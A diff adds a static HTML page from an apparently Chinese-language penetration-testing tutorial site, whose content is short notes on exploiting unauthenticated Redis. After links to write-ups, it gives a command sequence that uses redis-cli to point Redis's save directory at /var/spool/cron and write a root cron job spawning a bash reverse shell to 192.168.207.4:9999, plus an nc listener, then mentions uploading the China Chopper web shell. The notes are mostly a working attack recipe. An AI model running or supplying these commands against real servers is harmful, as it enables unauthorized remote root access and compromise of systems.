@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>计算机基础教程</title>
+    <meta name="description" content="软件开发教程，渗透测试入门教程，区块链入门教程，物联网，大数据">
+    
+    
+    <link rel="preload" href="/docs/assets/css/0.styles.8afa94d5.css" as="style"><link rel="preload" href="/docs/assets/js/app.04e0cac6.js" as="script"><link rel="preload" href="/docs/assets/js/2.5d2fca3b.js" as="script"><link rel="preload" href="/docs/assets/js/8.5b01303a.js" as="script"><link rel="prefetch" href="/docs/assets/js/10.ca521701.js"><link rel="prefetch" href="/docs/assets/js/3.181d06a7.js"><link rel="prefetch" href="/docs/assets/js/4.6b1b1ab7.js"><link rel="prefetch" href="/docs/assets/js/5.15cc1684.js"><link rel="prefetch" href="/docs/assets/js/6.ea4855c3.js"><link rel="prefetch" href="/docs/assets/js/7.c17167ed.js"><link rel="prefetch" href="/docs/assets/js/9.32c0622d.js">
+    <link rel="stylesheet" href="/docs/assets/css/0.styles.8afa94d5.css">
+  </head>
+  <body>
+    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/docs/" class="home-link router-link-active"><!----> <span class="site-name">计算机基础教程</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/docs/" class="nav-link">机器指令</a></div><div class="nav-item"><a href="/docs/coder2hacker/" class="nav-link router-link-active">渗透测试</a></div><div class="nav-item"><a href="/docs/blockchain/" class="nav-link">区块链</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/docs/" class="nav-link">机器指令</a></div><div class="nav-item"><a href="/docs/coder2hacker/" class="nav-link router-link-active">渗透测试</a></div><div class="nav-item"><a href="/docs/blockchain/" class="nav-link">区块链</a></div> <!----></nav>  <ul class="sidebar-links"><li><a href="/docs/coder2hacker/" class="sidebar-link">黑客入门</a></li><li><a href="/docs/blockchain/" class="sidebar-link">区块链入门</a></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><p>redis 漏洞利用
+https://github.com/antirez/redis/issues/3594
+https://webcache.googleusercontent.com/search?q=cache:6c-N8GHMMdIJ:https://www.jianshu.com/p/b8009a6772cf+&amp;cd=6&amp;hl=en&amp;ct=clnk&amp;gl=sg&amp;client=firefox-b-d</p> <p>redis利用姿势收集 https://phpinfo.me/2016/07/07/1275.html
+对一次 redis 未授权写入攻击的分析以及 redis 4.x RCE 学习 https://www.k0rz3n.com/2019/07/29/对一次 redis 未授权写入攻击的分析以及 redis 4.x RCE 学习/
+配置漏洞之redis未授权访问 https://uknowsec.cn/posts/skill/配置漏洞之redis未授权访问.html
+https://xz.aliyun.com/t/2240</p> <p>反弹shell
+靶机用root启动redis
+攻击机</p> <div class="language- extra-class"><pre class="language-text"><code>apt-get install redis -y
+redis-cli -h 192.168.207.3
+CONFIG SET dir /var/spool/cron
+CONFIG SET dbfilename root
+set payload &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.207.4/9999 0&gt;&amp;1\n\n&quot;
+Save
+Exit
+nc -l -p 9999
+</code></pre></div><p>上传中国菜刀</p></div> <footer class="page-edit"><!----> <!----></footer> <!----> </main></div><div class="global-ui"></div></div>
+    <script src="/docs/assets/js/app.04e0cac6.js" defer></script><script src="/docs/assets/js/2.5d2fca3b.js" defer></script><script src="/docs/assets/js/8.5b01303a.js" defer></script>
+  </body>
+</html>
